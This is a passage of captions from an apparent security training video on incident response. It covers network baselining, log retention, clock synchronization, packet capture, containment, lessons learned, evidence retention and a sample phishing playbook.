00:13:08.000\nBecause if you don't know how\nthe network typically is activated,\n\n270\n00:13:08.000 --> 00:13:11.290\nlike if Mike calls and says,\nmy computer is running slowly,\n\n271\n00:13:11.290 --> 00:13:13.900\nhow do I know that Mike has\na spike in his network traffic?\n\n272\n00:13:13.900 --> 00:13:17.570\nMaybe Mike's computer is always\nhigh in network utilization.\n\n273\n00:13:17.570 --> 00:13:20.270\nMaybe he's transferring\nvideo files back and\n\n274\n00:13:20.270 --> 00:13:24.525\nforth between an FTP server that's in\nthe cloud and down to his workstation.\n\n275\n00:13:25.660 --> 00:13:29.040\nAnd it could be, and so Mike is typically\nI don't know, if I don't know that,\n\n276\n00:13:29.040 --> 00:13:34.200\nI can't gauge whether it's high\nutilization or low utilization.\n\n277\n00:13:34.200 --> 00:13:37.800\nRight so creating these baselines for\nsystems and networks,\n\n278\n00:13:37.800 --> 00:13:39.750\nmaking network profiles.\n\n279\n00:13:39.750 --> 00:13:43.330\nAll those tools that we're having already\nbeing able to do those things and\n\n280\n00:13:43.330 --> 00:13:48.110\nhaving them done gives us another tool and\nthe key to be able to go.\n\n281\n00:13:48.110 --> 00:13:50.460\nWell, this is how it's supposed to look.\n\n282\n00:13:50.460 --> 00:13:52.410\nHow it normally looks.\n\n283\n00:13:52.410 --> 00:13:53.450\nHow it normally acts.\n\n284\n00:13:53.450 --> 00:13:56.350\nHow does Mike know that his\ncomputer is running slowly?\n\n285\n00:13:56.350 --> 00:13:57.130\n&gt;&gt; Right?\n&gt;&gt; Because he\n\n286\n00:13:57.130 --> 00:14:01.200\nknows cuz he works it it everyday\nhow it normally operates.\n\n287\n00:14:01.200 --> 00:14:04.680\nWhen he click something there's x amount\nof time that occurs before the action\n\n288\n00:14:04.680 --> 00:14:07.710\nis completed, or done,\nor something occurs.\n\n289\n00:14:07.710 --> 00:14:09.750\nHe knows that, so I use him.\n\n290\n00:14:09.750 --> 00:14:14.720\nIf it's me, I know typically how my\nnetwork runs, and I'll be able to spot\n\n291\n00:14:14.720 --> 00:14:18.428\nvery quickly when something isn't\ngoing the way I expect it to.\n\n292\n00:14:18.428 --> 00:14:21.045\nWhat else?\n\n293\n00:14:21.045 --> 00:14:26.460\nLet's, yeah, normally the five policy for\nlogging events.\n\n294\n00:14:26.460 --> 00:14:30.080\nWe kind of into it this,\nyou definitely want to do this.\n\n295\n00:14:30.080 --> 00:14:32.340\nI think all of this stuff is\nactually in this document as well.\n\n296\n00:14:32.340 --> 00:14:34.880\nIf I move down, there we go.\n\n297\n00:14:34.880 --> 00:14:39.040\nProfile network and systems,\nI've talked about profiling.\n\n298\n00:14:39.040 --> 00:14:40.960\nUnderstand normal behaviors,\n\n299\n00:14:40.960 --> 00:14:45.240\ncreate a log retention policy,\nthese are all great stuff.\n\n300\n00:14:45.240 --> 00:14:47.410\nAgain you can just walk\nthis documentation,\n\n301\n00:14:47.410 --> 00:14:50.680\nit won't take you very long\nit's not that big of a section.\n\n302\n00:14:50.680 --> 00:14:53.260\nBut you do need to understand\nthese concepts and\n\n303\n00:14:53.260 --> 00:14:56.250\nthe definitions behind them so\nthat you can answer questions on them.\n\n304\n00:14:56.250 --> 00:15:03.460\nWhat is a good way to build out an\nincidents I'm sorry, and so response plan.\n\n305\n00:15:03.460 --> 00:15:05.170\nWhat's the way to do this?\n\n306\n00:15:05.170 --> 00:15:08.090\nThis is basically trying to give\nyou a framework for doing that.\n\n307\n00:15:08.090 --> 00:15:09.420\n&gt;&gt; Logging can be a tricky one too,\n\n308\n00:15:09.420 --> 00:15:13.200\npeople get tempted to log every\nsingle thing that goes on.\n\n309\n00:15:13.200 --> 00:15:16.650\nAnd all of a sudden it becomes very\ndifficult to find what you're looking for,\n\n310\n00:15:16.650 --> 00:15:21.300\nthe important stuff, it's buried\namongst all these normal activities.\n\n311\n00:15:21.300 --> 00:15:25.320\nAnd if you're not logging appropriately\nlike you get logs from the servers but\n\n312\n00:15:25.320 --> 00:15:27.680\nyou didn't keep the logs from the router.\n\n313\n00:15:27.680 --> 00:15:31.630\nHow do you start correlating those\nevents to see the path of that attack\n\n314\n00:15:31.630 --> 00:15:35.015\ntook through your network if one\nof your devices is missing logs.\n\n315\n00:15:35.015 --> 00:15:38.025\nYou only kept it for one day on this\ndevice but you're keeping it for\n\n316\n00:15:38.025 --> 00:15:39.095\na week on this device.\n\n317\n00:15:39.095 --> 00:15:39.875\n&gt;&gt; Right.\n&gt;&gt; Now things like\n\n318\n00:15:39.875 --> 00:15:42.485\nthat can really throw you off, so\nit's important to lay that out in plan.\n\n319\n00:15:42.485 --> 00:15:43.765\n&gt;&gt; That's very good advice.\n\n320\n00:15:43.765 --> 00:15:46.439\nAnybody that's worked\ninside of systems for\n\n321\n00:15:46.439 --> 00:15:50.096\nany length of time understands\nthe importance of logs as unfun\n\n322\n00:15:50.096 --> 00:15:53.418\nas it is to deal with them\nbecause it definitely is that.\n\n323\n00:15:53.418 --> 00:15:55.858\nIt is a necessary evil\ninside of our world.\n\n324\n00:15:55.858 --> 00:15:56.479\nSo.\n\n325\n00:15:56.479 --> 00:15:59.415\nJust do your best at figuring\nout what's important,\n\n326\n00:15:59.415 --> 00:16:01.510\nmake sure that it's getting logged.\n\n327\n00:16:01.510 --> 00:16:04.630\nAnd then make sure you can either\nfind a third party tool, or\n\n328\n00:16:04.630 --> 00:16:07.510\ndevelop your own tool, or\ncorrelating those logs.\n\n329\n00:16:07.510 --> 00:16:10.350\nFilter in those logs into\nthe important information in a way\n\n330\n00:16:10.350 --> 00:16:12.880\nthat's more easily digestible,\nthat can really, really, help.\n\n331\n00:16:12.880 --> 00:16:14.240\nAnd then how long should we keep them?\n\n332\n00:16:14.240 --> 00:16:16.020\nWhat is the log retention policy?\n\n333\n00:16:16.020 --> 00:16:16.650\n&gt;&gt; Mm-hm.\n\n334\n00:16:16.650 --> 00:16:18.790\n&gt;&gt; And that's just gonna\ndepend on the environment.\n\n335\n00:16:18.790 --> 00:16:20.460\nYou can't say hard and fast.\n\n336\n00:16:20.460 --> 00:16:22.860\nIt's six months and\nthen you get rid of it.\n\n337\n00:16:22.860 --> 00:16:24.140\nIt's two years and you get rid of it.\n\n338\n00:16:24.140 --> 00:16:26.260\nIt's two days and you get rid of it.\n\n339\n00:16:26.260 --> 00:16:30.270\nIt's all about what it is in your\nenvironment that you log in and\n\n340\n00:16:30.270 --> 00:16:33.810\nhow sensitive important\nit is to your systems.\n\n341\n00:16:33.810 --> 00:16:36.140\nAll right, let's look at the next one,\n\n342\n00:16:36.140 --> 00:16:41.330\nperform event correlation kind of,\nMike already spoke on that.\n\n343\n00:16:41.330 --> 00:16:42.050\n&gt;&gt; Oops, sorry.\n\n344\n00:16:42.050 --> 00:16:42.763\n&gt;&gt; That's okay, that's okay.\n\n345\n00:16:42.763 --> 00:16:43.640\n&gt;&gt; [LAUGH]\n&gt;&gt; See, he understands\n\n346\n00:16:43.640 --> 00:16:44.550\nthe logic of it, though.\n\n347\n00:16:44.550 --> 00:16:47.080\nAnd that's,\nit's basically a logical progression.\n\n348\n00:16:47.080 --> 00:16:50.230\nYou don't have to be a genius\nto figure this stuff out,\n\n349\n00:16:50.230 --> 00:16:52.780\nyou just need to be aware that these\nare the things that we use to do.\n\n350\n00:16:52.780 --> 00:16:55.760\nAnd a lot of times your own mind will\nlogically take you to the next step,\n\n351\n00:16:55.760 --> 00:16:57.340\nwhich it did with Mike\ncuz he's a logical guy.\n\n352\n00:16:57.340 --> 00:16:58.307\nIt's why I like him.\n\n353\n00:16:58.307 --> 00:17:00.670\n[LAUGH] He's fun to be around.\n\n354\n00:17:00.670 --> 00:17:03.020\nKeep all host clocks synchronized.\n\n355\n00:17:03.020 --> 00:17:04.110\nA very important key.\n\n356\n00:17:04.110 --> 00:17:07.670\nA lot of people might not understand that,\ncuz here's what happens.\n\n357\n00:17:07.670 --> 00:17:12.800\nIf my clocks are not synchronized and\nI've got a log, so\n\n358\n00:17:12.800 --> 00:17:17.690\nI'm logging Mike's computer and\nMike's clock is off by 17 minutes.\n\n359\n00:17:18.700 --> 00:17:21.530\nAnd an event occurs at 12:01 AM.\n\n360\n00:17:21.530 --> 00:17:23.882\nWell, his says it's 11, whatever,\n40-something maybe, right.\n\n361\n00:17:23.882 --> 00:17:30.200\nWell, now I take those evidence to court.\n\n362\n00:17:30.200 --> 00:17:31.340\nI gather that evidence.\n\n363\n00:17:31.340 --> 00:17:32.360\nI take it to court.\n\n364\n00:17:32.360 --> 00:17:34.272\nThey go, when did the event occur, 12:01?\n\n365\n00:17:34.272 --> 00:17:36.961\nWell, this clock said\nthat it was at 12:42.\n\n366\n00:17:36.961 --> 00:17:38.315\nThere you go.\n\n367\n00:17:38.315 --> 00:17:39.340\nThrow it out.\n\n368\n00:17:39.340 --> 00:17:40.020\n&gt;&gt; It's not gonna be good.\n\n369\n00:17:40.020 --> 00:17:40.870\n&gt;&gt; Right.\n\n370\n00:17:40.870 --> 00:17:44.308\n&gt;&gt; And\nagain trying to correlate across devices.\n\n371\n00:17:44.308 --> 00:17:48.920\nWhen you're, okay it happened at 12:01\naccording to this log, I'll go look at\n\n372\n00:17:48.920 --> 00:17:53.070\nthe router logs for 12:01 or just\na little before and nothing's happening.\n\n373\n00:17:53.070 --> 00:17:54.720\nLike wait, what's going on here?\n\n374\n00:17:54.720 --> 00:17:55.890\n&gt;&gt; Right.\n&gt;&gt; The clocks were off,\n\n375\n00:17:55.890 --> 00:17:58.830\nit didn't happen at 12:01 it\nactually happened at 11:45.\n\n376\n00:17:58.830 --> 00:18:01.810\nBut now it's not much more\ndifficult to tie it together, and\n\n377\n00:18:01.810 --> 00:18:03.740\nas you said the courts can accept that.\n\n378\n00:18:03.740 --> 00:18:04.880\n&gt;&gt; Yeah, exactly.\n\n379\n00:18:04.880 --> 00:18:08.850\nYou've blown the credibility of\nthe log itself unless you are able\n\n380\n00:18:08.850 --> 00:18:11.360\nto come back and\nprove that that the times were off.\n\n381\n00:18:11.360 --> 00:18:13.010\nYou could verify their time, right?\n\n382\n00:18:13.010 --> 00:18:15.960\nBut that will be a lot of work, and\nthen you would have to then prove it.\n\n383\n00:18:15.960 --> 00:18:19.280\nWhen if you just set up something like\nNetwork Time Protocol Server on your\n\n384\n00:18:19.280 --> 00:18:24.250\nnetwork, everything synchronizes\nwith an NTP and you're done, right?\n\n385\n00:18:24.250 --> 00:18:25.750\nYou don't have to worry about that,\n\n386\n00:18:25.750 --> 00:18:28.300\njust verify that these things\nare happening on a regular basis,\n\n387\n00:18:28.300 --> 00:18:32.008\ndoing your due diligence to just to make\nsure that nothing has gotten out of sync.\n\n388\n00:18:32.008 --> 00:18:34.700\nAnd there you go, all right.\n\n389\n00:18:34.700 --> 00:18:37.120\nIf you are in Windows environment\nyou'll have people come and go.\n\n390\n00:18:37.120 --> 00:18:38.880\nI can well get logged into the network.\n\n391\n00:18:38.880 --> 00:18:40.849\n&gt;&gt; Right.\n&gt;&gt; Cuz their time may be gotten off.\n\n392\n00:18:40.849 --> 00:18:44.161\n&gt;&gt; Mm-hm.\n&gt;&gt; And so that disrupts the log on server\n\n393\n00:18:44.161 --> 00:18:49.990\nfrom saying you might not be a part of\nmy network because you're out of time.\n\n394\n00:18:49.990 --> 00:18:51.780\nThis could be an attack.\n\n395\n00:18:51.780 --> 00:18:54.290\nSo just says no, not gonna happen.\n\n396\n00:18:54.290 --> 00:18:56.910\nYou must be within a certain modicum\n\n397\n00:18:56.910 --> 00:19:00.520\nof time with my time before I'm\ngonna allow you into the system.\n\n398\n00:19:00.520 --> 00:19:02.760\nSo that can help us as\nwell as timing attacks but\n\n399\n00:19:02.760 --> 00:19:04.160\nI have had to work around that before.\n\n400\n00:19:04.160 --> 00:19:05.380\nSo just be aware of that.\n\n401\n00:19:05.380 --> 00:19:08.080\nAll right, maintain and\n\n402\n00:19:08.080 --> 00:19:12.400\nuse a knowledge base of information,\nright, this is documentation.\n\n403\n00:19:14.050 --> 00:19:15.930\nYou should be documenting everything,\n\n404\n00:19:15.930 --> 00:19:19.320\nbecause information is\nthe key to this entire game.\n\n405\n00:19:19.320 --> 00:19:22.420\nThe more you know about your systems,\nthe more you have documented,\n\n406\n00:19:22.420 --> 00:19:24.390\nthe more I can go and easily find that.\n\n407\n00:19:24.390 --> 00:19:27.910\nEither through an Internet site,\nlocal wiki, goodness knows,\n\n408\n00:19:27.910 --> 00:19:33.480\na binder, a three-ring binder on\na shelf with this stuff inside of it,\n\n409\n00:19:33.480 --> 00:19:34.910\nis better than nothing, all right?\n\n410\n00:19:34.910 --> 00:19:38.623\nAnd actually you might probably\nwanna do that, to honest with you.\n\n411\n00:19:38.623 --> 00:19:39.859\n&gt;&gt; [LAUGH]\n&gt;&gt; Yeah,\n\n412\n00:19:39.859 --> 00:19:41.990\ncreate a paper copy of these things.\n\n413\n00:19:41.990 --> 00:19:43.800\nNow let's see here, where we at here?\n\n414\n00:19:45.730 --> 00:19:49.450\nIt's Internet search engines for research,\n\n415\n00:19:51.200 --> 00:19:54.945\nI think at this point we all kind of\nknow this one, Google is our friend.\n\n416\n00:19:54.945 --> 00:19:57.800\nWhen we don't know thing\nwe go to Google or\n\n417\n00:19:57.800 --> 00:20:00.610\nas Adam calls it the oracle\nof the Internet.\n\n418\n00:20:00.610 --> 00:20:01.938\nKnows all sees all.\n\n419\n00:20:01.938 --> 00:20:02.938\nThere it is.\n\n420\n00:20:02.938 --> 00:20:06.490\n[COUGH] I run pack and\nsniffers to collect data then you gotta\n\n421\n00:20:06.490 --> 00:20:11.380\nfilter the data find these different\nfiltering devices you can use to.\n\n422\n00:20:11.380 --> 00:20:13.180\nWe talked about before you\ncan either create one or\n\n423\n00:20:13.180 --> 00:20:16.520\ndownload a third party that will\nhelp you better correlate that data,\n\n424\n00:20:16.520 --> 00:20:20.345\nbring it down to something that's\neasily looked through, sift through.\n\n425\n00:20:20.345 --> 00:20:24.140\nCuz that's the name of the game finding\nthe pertinent information quickly and\n\n426\n00:20:24.140 --> 00:20:25.640\nfiltering will allow us to do that.\n\n427\n00:20:26.750 --> 00:20:30.770\nSeek assistance from others,\nyou're not the lone gun out there.\n\n428\n00:20:30.770 --> 00:20:33.140\nThere are other people out there\nwho would love to be involved and\n\n429\n00:20:33.140 --> 00:20:37.940\nhelp you especially when they have\nthe expertise that maybe you or I lack.\n\n430\n00:20:37.940 --> 00:20:40.640\nMike and I could be on\nan incident response team, but\n\n431\n00:20:40.640 --> 00:20:44.930\nmaybe we're not the best at\nworking with memory dumps.\n\n432\n00:20:44.930 --> 00:20:47.990\nThat junk is just some next level stuff.\n\n433\n00:20:47.990 --> 00:20:50.790\nAnd, we just haven't have the time to\nget trained up sufficiently on it.\n\n434\n00:20:50.790 --> 00:20:52.370\nWe need to call in someone that does.\n\n435\n00:20:52.370 --> 00:20:53.470\nSo, we call in Don.\n\n436\n00:20:53.470 --> 00:20:57.440\nWe know Don is the volatility king,\nand we get him to come.\n\n437\n00:20:57.440 --> 00:21:01.330\nWe ask him questions,\nwe use them as a resource, right?\n\n438\n00:21:01.330 --> 00:21:04.010\nIt's all about bringing\nthe outside resources in and\n\n439\n00:21:04.010 --> 00:21:08.660\ndocumenting who they are so, that we know\nwho they are, when we need them, right?\n\n440\n00:21:08.660 --> 00:21:12.990\nSo make sure that you seek assistance\nfrom others when necessary.\n\n441\n00:21:14.520 --> 00:21:15.560\nAll right, where are we?\n\n442\n00:21:15.560 --> 00:21:19.240\nI'm making sure that I didn't skip\nanything at all, because well,\n\n443\n00:21:19.240 --> 00:21:21.452\nI like to make it be thorough for\nyou good folks out there.\n\n444\n00:21:21.452 --> 00:21:23.677\n&gt;&gt; [LAUGH]\n&gt;&gt; Keeping up to date technology base.\n\n445\n00:21:23.677 --> 00:21:25.110\n&gt;&gt; Keeping up to date technology base,\nyeah.\n\n446\n00:21:25.110 --> 00:21:29.830\n&gt;&gt; Keeping up to date knowledge base about\nthe system kind of going back to where\n\n447\n00:21:29.830 --> 00:21:34.320\nyou're doing things like maintaining\na knowledge base of information.\n\n448\n00:21:34.320 --> 00:21:37.110\nKeep those binders,\nkeep that documentation, create that wiki,\n\n449\n00:21:37.110 --> 00:21:42.250\ncreate that Internet page that has\nall these lovely documents of it.\n\n450\n00:21:42.250 --> 00:21:44.990\nWe have every piece of\ninformation that we'll need.\n\n451\n00:21:44.990 --> 00:21:47.520\nSo that we can,\nwe when start looking at evidence,\n\n452\n00:21:47.520 --> 00:21:52.280\nif we don't have what it should look like,\nwe won't be able to spot the anomalies\n\n453\n00:21:52.280 --> 00:21:57.725\nthat will lead us to indicators,\ncompromise and the evidence needed to.\n\n454\n00:21:57.725 --> 00:22:01.635\nMaybe even persecutes or just figure\nout what the heck happened, right.\n\n455\n00:22:01.635 --> 00:22:03.645\nSo keeping the knowledge\nbase is really good,\n\n456\n00:22:03.645 --> 00:22:07.925\nand this should include things like\nsystem profiles, patents of use.\n\n457\n00:22:07.925 --> 00:22:13.205\nWe talked about that anything that\nmay help a response to key member\n\n458\n00:22:13.205 --> 00:22:18.250\nwho is not familiar with\nthe system as a whole.\n\n459\n00:22:18.250 --> 00:22:21.510\nAnd maybe I'm not familiar\nwith that part of the system,\n\n460\n00:22:21.510 --> 00:22:23.800\nbecause I don't typically work there,\nright.\n\n461\n00:22:23.800 --> 00:22:27.720\nSo having that information readily\navailable in some format is a very,\n\n462\n00:22:27.720 --> 00:22:30.020\nvery helpful thing.\n\n463\n00:22:30.020 --> 00:22:32.640\nSo it does talk right here\nabout run packet sniffers and\n\n464\n00:22:32.640 --> 00:22:33.640\ncollect additional data.\n\n465\n00:22:35.860 --> 00:22:39.530\nTypically what they mean\nis when you feel like, or\n\n466\n00:22:39.530 --> 00:22:44.700\nyou think a incident is occurring,\nstart the packet capture.\n\n467\n00:22:44.700 --> 00:22:50.410\nStart grabbing stuff ASAP so\nthat you have that network data, right?\n\n468\n00:22:50.410 --> 00:22:53.500\nAnd you might be doing this randomly, you\nmight just be doing this for the fun of it\n\n469\n00:22:53.500 --> 00:22:59.010\nif you've got the storage for it and\nthe actual hardware to make that happen.\n\n470\n00:22:59.010 --> 00:23:00.730\nBut if you don't, that's fine.\n\n471\n00:23:00.730 --> 00:23:02.200\nBut if you do, great.\n\n472\n00:23:02.200 --> 00:23:07.020\nBut if you think an incident is happening,\nhit that Wireshark, fire it up, whatever\n\n473\n00:23:07.020 --> 00:23:13.020\nyou've got, some kind of logging for the\nnetwork traffic and capture that stuff.\n\n474\n00:23:13.020 --> 00:23:16.150\nCould just be as good as a TCP dump,\nright.\n\n475\n00:23:16.150 --> 00:23:18.300\nFire one off and away you go.\n\n476\n00:23:18.300 --> 00:23:20.540\nGet those locks cause you're gonna\nneed them for down the road.\n\n477\n00:23:22.075 --> 00:23:25.490\nLet's see here filtering information\njust organizing as needed.\n\n478\n00:23:25.490 --> 00:23:27.370\nExclude unnecessary data.\n\n479\n00:23:27.370 --> 00:23:28.610\nThat's another great\nthing about filtering.\n\n480\n00:23:28.610 --> 00:23:31.530\nI'm saying well this is normal\nstuff that I don't need.\n\n481\n00:23:31.530 --> 00:23:33.150\nIts not part it so\nI can just push it over here.\n\n482\n00:23:33.150 --> 00:23:37.514\nAnd only you as someone who works on\nthat environment will be able to make\n\n483\n00:23:37.514 --> 00:23:38.250\nthat call.\n\n484\n00:23:39.280 --> 00:23:41.550\nThen let's talk about containment and\nrecovery.\n\n485\n00:23:41.550 --> 00:23:45.489\nI think that is incident\ndocumentation is the next.\n\n486\n00:23:45.489 --> 00:23:50.453\nBut, containment and recovery, employ\nan appropriate containment strategies when\n\n487\n00:23:50.453 --> 00:23:52.494\nit comes to whatever has occurred.\n\n488\n00:23:52.494 --> 00:23:56.350\nIf I feel like there's\nmalware on the system, well,\n\n489\n00:23:56.350 --> 00:24:02.300\nit's time to isolate the system and\ndo the isolation of the actual malware.\n\n490\n00:24:02.300 --> 00:24:05.100\nBecause the term for it whatever,\nright now, I can't figure it.\n\n491\n00:24:06.820 --> 00:24:10.090\nThe anti-virus will say I have done a-\n&gt;&gt; Quarantine\n\n492\n00:24:10.090 --> 00:24:10.910\n&gt;&gt; The quarantine, thank you.\n\n493\n00:24:10.910 --> 00:24:11.490\nThat's the word.\n\n494\n00:24:11.490 --> 00:24:13.860\nFor whatever reason it\nwouldn't come into my head.\n\n495\n00:24:13.860 --> 00:24:16.500\nYour intermediary system will\nquarantine these things off, so\n\n496\n00:24:16.500 --> 00:24:17.940\nthat you can look at them later.\n\n497\n00:24:17.940 --> 00:24:20.690\nBut get them off of the system,\nget the system isolated.\n\n498\n00:24:20.690 --> 00:24:24.823\nWhatever is going on,\nyou can take appropriate steps for\n\n499\n00:24:24.823 --> 00:24:28.191\nisolating it, stopping the attack, right?\n\n500\n00:24:28.191 --> 00:24:30.974\nAnd then I'll start\ngathering the evidence, and\n\n501\n00:24:30.974 --> 00:24:35.670\nyou might wanna identify the attackers\nif you can, or the attacking system.\n\n502\n00:24:35.670 --> 00:24:39.410\nSo maybe I see some high\nnetwork traffic that's going to\n\n503\n00:24:39.410 --> 00:24:42.670\nthis IP address at this port,\nwell what is that?\n\n504\n00:24:42.670 --> 00:24:46.390\nAnd if I do a look up of that IP\naddress maybe it falls under a known\n\n505\n00:24:46.390 --> 00:24:49.182\nmalware CNC kinda thing, right?\n\n506\n00:24:49.182 --> 00:24:51.760\nSo that's the kinda evidence\nthat you wanna start gathering.\n\n507\n00:24:53.100 --> 00:24:53.920\nWhat else?\n\n508\n00:24:53.920 --> 00:24:56.720\nEliminate and remediate attacks and\nits effects so\n\n509\n00:24:56.720 --> 00:24:58.670\nthat you can get back to business.\n\n510\n00:24:58.670 --> 00:25:00.460\nYou wanna get that BCDR, right?\n\n511\n00:25:00.460 --> 00:25:02.990\nBusiness Continuity and Disaster Recovery.\n\n512\n00:25:02.990 --> 00:25:04.110\nGet flowing through there.\n\n513\n00:25:05.500 --> 00:25:09.760\nThen moving into the post incident\nactivity, do your lessons learn.\n\n514\n00:25:09.760 --> 00:25:11.000\nWhat did we learn about this?\n\n515\n00:25:11.000 --> 00:25:14.550\nOnce the incident is done we have\nWe figured something was happening,\n\n516\n00:25:14.550 --> 00:25:18.270\nwe did our evidence-gathering,\nwe stopped the attack.\n\n517\n00:25:18.270 --> 00:25:23.090\nAnd now we're post-incident,\nwell, what do we do, right?\n\n518\n00:25:23.090 --> 00:25:27.250\nAnd that is, figure out what can we learn\nfrom this, why did we get attacked?\n\n519\n00:25:27.250 --> 00:25:30.070\nWhat can we do to stop further attacks?\n\n520\n00:25:30.070 --> 00:25:34.720\nWhat happened, how can we prevent\nthem specifically call out,\n\n521\n00:25:34.720 --> 00:25:36.880\nwhat is it that happens specifically.\n\n522\n00:25:36.880 --> 00:25:38.640\nMake sure you put that there.\n\n523\n00:25:38.640 --> 00:25:40.930\nWhat time did it happen?\n\n524\n00:25:40.930 --> 00:25:43.160\nWas procedure followed?\n\n525\n00:25:43.160 --> 00:25:44.680\nRight?\n\n526\n00:25:44.680 --> 00:25:48.190\nAny missteps, did we do anything wrong?\n\n527\n00:25:48.190 --> 00:25:51.580\nSomething we shouldn't have done\nthat can cause a problem or\n\n528\n00:25:51.580 --> 00:25:53.680\ncaused a problem down the road, right?\n\n529\n00:25:55.030 --> 00:25:58.240\nAnything that could have been done\ndifferently or just better, right?\n\n530\n00:25:58.240 --> 00:25:59.330\nWell we used this tool.\n\n531\n00:25:59.330 --> 00:26:02.490\nWell you know what, that other tool I\nknow it's a little bit more money, but\n\n532\n00:26:02.490 --> 00:26:04.610\nit really would have been handy to have.\n\n533\n00:26:04.610 --> 00:26:06.880\nMaybe we'll put that in the budget for\nnext year.\n\n534\n00:26:06.880 --> 00:26:09.280\nThese are the kind of things\nthat we are working through.\n\n535\n00:26:09.280 --> 00:26:13.457\nAny good indicators that could be used\nto detect similar attacks in the future?\n\n536\n00:26:13.457 --> 00:26:16.600\nWhat else, any tools or\nresources that could have been used.\n\n537\n00:26:16.600 --> 00:26:19.120\nThings like that,\njust kinda thinking on down the road,\n\n538\n00:26:19.120 --> 00:26:21.800\nwhat can we have learned from this?\n\n539\n00:26:21.800 --> 00:26:24.860\n&gt;&gt; It's a really good time, I think,\nto take a look at your plan.\n\n540\n00:26:24.860 --> 00:26:28.860\nAnd I know we've talked about how your\nincidence response plan is test it, right?\n\n541\n00:26:28.860 --> 00:26:30.436\nWe run through different\ntypes of exercises.\n\n542\n00:26:30.436 --> 00:26:31.076\n&gt;&gt; Yeah.\n\n543\n00:26:31.076 --> 00:26:32.810\n&gt;&gt; And those are always good.\n\n544\n00:26:32.810 --> 00:26:36.340\nBut nothing test it like\nan actual incident.\n\n545\n00:26:36.340 --> 00:26:39.050\nAnd so it's a great time to sit back and\ngo, okay,\n\n546\n00:26:39.050 --> 00:26:42.050\nnow that we're done,\nhow did our plan work?\n\n547\n00:26:42.050 --> 00:26:45.290\nWhere can we make adjustments that\nmaybe could make that process\n\n548\n00:26:45.290 --> 00:26:46.090\nrun a little smoother?\n\n549\n00:26:46.090 --> 00:26:47.430\n&gt;&gt; Yeah, that's a good point.\n\n550\n00:26:47.430 --> 00:26:51.770\nNothing really kind of burns this stuff\ninto our brains better than an example.\n\n551\n00:26:51.770 --> 00:26:54.220\nSo I was able to find a sample playbook.\n\n552\n00:26:54.220 --> 00:26:58.350\nSo during you're developing playbook\nbasically, this is the quick and\n\n553\n00:26:58.350 --> 00:26:59.530\ndirty, not quick and dirty,\n\n554\n00:26:59.530 --> 00:27:04.740\nbut the steps that you take for\nresponding to x type of incidents.\n\n555\n00:27:04.740 --> 00:27:06.660\n&gt;&gt; Cool.\n&gt;&gt; Right, so we have that.\n\n556\n00:27:06.660 --> 00:27:10.450\nAlso before we go, too far just really\nquickly wanna talk about retention of\n\n557\n00:27:10.450 --> 00:27:12.560\nevidence kind of an important thing.\n\n558\n00:27:12.560 --> 00:27:17.760\nTypically they tell you, you want to\ndiscard evidence as soon as possible.\n\n559\n00:27:17.760 --> 00:27:20.860\nThat doesn't mean you should go well,\nwe're done with the lawsuit,\n\n560\n00:27:20.860 --> 00:27:21.940\nthrow it in the garbage.\n\n561\n00:27:21.940 --> 00:27:23.190\nWe need to get with legal,\n\n562\n00:27:23.190 --> 00:27:27.680\nyou find out how long before I can dispose\nof this stuff, and then get rid of it.\n\n563\n00:27:27.680 --> 00:27:30.740\nCreate a policy for\nhow long you have retention.\n\n564\n00:27:30.740 --> 00:27:33.780\nMaybe that is discuss with legal and\nlegal tells you, but\n\n565\n00:27:33.780 --> 00:27:36.870\nI've seen typically about two years.\n\n566\n00:27:36.870 --> 00:27:41.750\nThe government, I've seen typically around\nthree years, but once that time's up, get\n\n567\n00:27:41.750 --> 00:27:44.440\nrid of it because it can be resubpoenaed,\nand you'd have to reopen the case,\n\n568\n00:27:44.440 --> 00:27:47.010\nand now you've gotta store\nthese things forever in a day.\n\n569\n00:27:47.010 --> 00:27:50.910\nSo create a policy so that when someone\ntries to subpoena evidence, you can say,\n\n570\n00:27:50.910 --> 00:27:53.000\nwell our policy is to get\nrid of it after two years,\n\n571\n00:27:53.000 --> 00:27:56.019\nit's three years down the road\nthat stuff's gone, right?\n\n572\n00:27:56.019 --> 00:27:58.230\nSo that is a very important part.\n\n573\n00:27:58.230 --> 00:28:01.970\nAll right let's see here, so developing\ninstant play book, let's bring it up.\n\n574\n00:28:01.970 --> 00:28:05.650\nI've got the copy right here and\nthere is a,\n\n575\n00:28:05.650 --> 00:28:09.120\napparently it took me right back to where\ni was at when I was looking at it earlier.\n\n576\n00:28:09.120 --> 00:28:13.920\nBut here we go, the Incident Play Book\nthis is specially towards Phishing.\n\n577\n00:28:13.920 --> 00:28:18.070\nAnd this is as of December 12th 2017,\nso this is a very recent\n\n578\n00:28:19.760 --> 00:28:24.210\nmethodologies would be used in here,\nnot anything old for you good folks.\n\n579\n00:28:24.210 --> 00:28:27.440\nAnd as it walks through, if you need\na copy of the license, there it is.\n\n580\n00:28:27.440 --> 00:28:28.420\nIt's under creative commons.\n\n581\n00:28:28.420 --> 00:28:29.430\nThat's why we're able to use it.\n\n582\n00:28:29.430 --> 00:28:31.330\nSo you can check that out if you'd like.\n\n583\n00:28:31.330 --> 00:28:32.950\nYou can download this.\n\n584\n00:28:32.950 --> 00:28:35.480\nI will have a link to\nit in the show notes.\n\n585\n00:28:35.480 --> 00:28:39.840\nAnd I'll probably also make it available\nas part of the show notes as well.\n\n586\n00:28:41.010 --> 00:28:44.310\nSo let's see here, and we'll just kinda\nwalk through the Table of Contents a bit.\n\n587\n00:28:44.310 --> 00:28:48.490\nIntroduction, the purpose of the phishing\nplaybook, what's in the scope of that?\n\n588\n00:28:48.490 --> 00:28:51.960\nWhat assumptions and\nlimitations are we gonna run against?\n\n589\n00:28:51.960 --> 00:28:54.550\nAnd then getting right\ninto the nitty-gritty,\n\n590\n00:28:54.550 --> 00:28:59.220\nphishing definition, process summary,\nphishing playbook procedures,\n\n591\n00:28:59.220 --> 00:29:04.610\nIdentification state, Triage,\nInvestigation or mediation, Post incident.\n\n592\n00:29:04.610 --> 00:29:08.420\nThese are all of the things we've been\ntalking about this entire episode.\n\n593\n00:29:08.420 --> 00:29:09.340\nIt's in the playbook.\n\n594\n00:29:09.340 --> 00:29:10.290\nYou put that stuff in here.\n\n595\n00:29:10.290 --> 00:29:13.120\nIt's why we do that,\nit's why we figure those things out.\n\n596\n00:29:13.120 --> 00:29:16.320\nAnd you put it in there, so that when\nsomething happens, I'm able to go, cool.\n\n597\n00:29:16.320 --> 00:29:17.450\nThen I can look at figures.\n\n598\n00:29:17.450 --> 00:29:19.565\nHere's the phishing\nincident response workflow.\n\n599\n00:29:19.565 --> 00:29:24.140\nSo they've even gone as far as 